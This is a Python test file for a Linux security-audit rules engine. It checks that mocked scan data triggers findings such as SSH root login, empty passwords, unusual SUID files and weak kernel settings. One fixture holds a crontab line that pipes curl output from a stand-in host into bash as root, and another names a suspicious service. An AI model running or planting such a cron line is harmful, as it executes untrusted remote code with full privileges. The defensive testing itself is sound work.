"""Teste pentru regulile Linux (os='linux'). Reguli pure pe payload mock-uit."""
from server.app.rules import evaluate


def _lscan(linux: dict, scan_type="deep", software=None):
    return {"scan_type": scan_type,
            "os": {"system": "Linux", "release": "6.5", "is_admin": False},
            "network": {"open_ports": []}, "processes": [],
            "software": software or [], "linux": linux}


def _ids(findings):
    return {f["rule_id"] for f in findings}


# ── critical_risk ──────────────────────────────────────────────────────────
def test_ssh_root_login():
    assert "LNX-SSH-ROOT-LOGIN-1" in _ids(evaluate(_lscan({"ssh": {"permit_root_login": "yes"}}))[2])

def test_ssh_empty_passwords():
    assert "LNX-SSH-EMPTY-PASSWORDS-1" in _ids(evaluate(_lscan({"ssh": {"permit_empty_passwords": "yes"}}))[2])

def test_empty_password():
    assert "LNX-EMPTY-PASSWD-1" in _ids(evaluate(_lscan({"users": {"empty_password_accounts": ["g"]}}))[2])

def test_uid0_extra():
    assert "LNX-UIDZERO-1" in _ids(evaluate(_lscan({"users": {"uid0_accounts": ["root", "bob"]}}))[2])

def test_pkg_vulnerable():
    f = evaluate(_lscan({"packages": [{"name": "openssl", "version": "OpenSSL 1.0.2"}]}))[2]
    # foloseste semnaturile existente: "OpenSSL 1.0"
    assert "LNX-PKG-VULNERABLE-1" in _ids(f)

def test_suid_uncommon():
    assert "LNX-SUID-UNCOMMON-1" in _ids(evaluate(_lscan({"suid": ["/usr/bin/weird"]}))[2])

def test_sgid_uncommon():
    assert "LNX-SGID-UNCOMMON-1" in _ids(evaluate(_lscan({"sgid": ["/usr/bin/weird2"]}))[2])


# ── network_exposure ───────────────────────────────────────────────────────
def test_fw_disabled():
    assert "LNX-FW-DISABLED-1" in _ids(evaluate(_lscan({"firewall": {"tool": "ufw", "active": False}}))[2])

def test_ssh_password_auth():
    assert "LNX-SSH-PASSWORD-AUTH-1" in _ids(evaluate(_lscan({"ssh": {"password_auth": "yes"}}))[2])


# ── hygiene ─────────────────────────────────────────────────────────────────
def test_sudo_nopasswd():
    assert "LNX-SUDO-NOPASSWD-1" in _ids(evaluate(_lscan({"users": {"sudo_nopasswd": ["x NOPASSWD: ALL"]}}))[2])

def test_world_writable():
    assert "LNX-WORLD-WRITABLE-1" in _ids(evaluate(_lscan({"world_writable": ["/etc/x"]}))[2])

def test_sysctl_ipfwd():
    assert "LNX-SYSCTL-IPFWD-1" in _ids(evaluate(_lscan({"sysctl": {"ip_forward": "1"}}))[2])

def test_aslr_weak():
    assert "LNX-ASLR-WEAK-1" in _ids(evaluate(_lscan({"sysctl": {"aslr": "0"}}))[2])

def test_coredump():
    assert "LNX-COREDUMP-1" in _ids(evaluate(_lscan({"sysctl": {"suid_dumpable": "1"}}))[2])

def test_autoupdate_off():
    assert "LNX-AUTOUPDATE-OFF-1" in _ids(evaluate(_lscan({"auto_updates": False}))[2])

def test_kernel_eol():
    assert "LNX-KERNEL-EOL-1" in _ids(evaluate(_lscan({"kernel": "3.2.0-4-amd64"}))[2])

def test_pass_aging():
    assert "LNX-PASS-AGING-1" in _ids(evaluate(_lscan({"login_defs": {"pass_max_days": "99999"}}))[2])

def test_umask_weak():
    assert "LNX-UMASK-WEAK-1" in _ids(evaluate(_lscan({"login_defs": {"umask": "000"}}))[2])

def test_x11_forwarding():
    assert "LNX-SSH-XFORWARD-1" in _ids(evaluate(_lscan({"ssh": {"x11_forwarding": "yes"}}))[2])

def test_tmp_noexec():
    assert "LNX-TMP-NOEXEC-1" in _ids(evaluate(_lscan({"tmp_missing_noexec": True}))[2])


# ── activity ────────────────────────────────────────────────────────────────
def test_cron_suspicious():
    f = evaluate(_lscan({"cron": [{"source": "/etc/crontab", "line": "* * * * * root curl http://x|bash"}]}))[2]
    assert "LNX-CRON-SUSPICIOUS-1" in _ids(f)

def test_service_suspicious():
    f = evaluate(_lscan({"services": [{"name": "evil.service", "exec": "/tmp/evil"}]}))[2]
    assert "LNX-SVC-SUSPICIOUS-1" in _ids(f)


# ── negative / izolare ──────────────────────────────────────────────────────
def test_clean_linux_no_linux_findings():
    clean = {"ssh": {"permit_root_login": "no", "password_auth": "no",
                     "permit_empty_passwords": "no", "x11_forwarding": "no"},
             "firewall": {"tool": "ufw", "active": True},
             "users": {"uid0_accounts": ["root"], "empty_password_accounts": [], "sudo_nopasswd": []},
             "sysctl": {"ip_forward": "0", "aslr": "2", "suid_dumpable": "0"},
             "login_defs": {"pass_max_days": "90", "umask": "027"},
             "kernel": "6.5.0", "auto_updates": True, "tmp_missing_noexec": False}
    assert not any(i.startswith("LNX-") for i in _ids(evaluate(_lscan(clean))[2]))

def test_linux_rules_skipped_on_windows():
    win = {"scan_type": "deep", "os": {"system": "Windows", "release": "11"},
           "network": {"open_ports": []}, "processes": [], "software": [],
           "linux": {"ssh": {"permit_root_login": "yes"}}}
    assert not any(i.startswith("LNX-") for i in _ids(evaluate(win)[2]))
